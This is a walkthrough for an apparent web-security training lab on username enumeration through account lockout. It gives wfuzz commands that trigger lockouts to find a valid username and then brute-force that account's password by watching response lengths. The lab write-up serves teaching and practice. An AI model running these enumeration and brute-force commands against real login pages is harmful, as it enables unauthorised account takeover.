@@ -1,0 +1,37 @@
+Lab07: Username enumeration via account lock
+PRACTITIONER
+
+PRINCIPLE
+When multiple login request to a username that exit are made, the users account is locked out
+
+
+
+METHOD
+Since we don't have burp pro, we are going to use wfuzz to complete the lab ( community edition for intruder is way to slow for this)
+
+First, we create a file named null_passwd.txt with 5 entries of the word "null" (the max login attempts to lock is 5 then lock)
+
+Now with that, we take the usernames provided and save to another file named usernames.txt
+
+Using
+ wfuzz -c \
+  -z file,usernames.txt \
+  -z file,null_passwd.txt \
+  -m product \
+  -d "username=FUZZ&password=FUZ2Z" \
+  -t 1 \
+  <lab_url/login>
+
+Once that is done we look for a request with a different content lenght returned (every other thing should be 3018) but one should be different
+
+With the odd one noted, take the name and replace the wfuzz command as
+
+ wfuzz -c \
+  -z file,passwords2.txt \
+  -d "username=<username>&password=FUZZ" \
+  -t 1 \
+  <lab_url/login>
+
+Once again monitor the content length and note the odd length
+
+Using the credentials found, log into the account to solve the lab
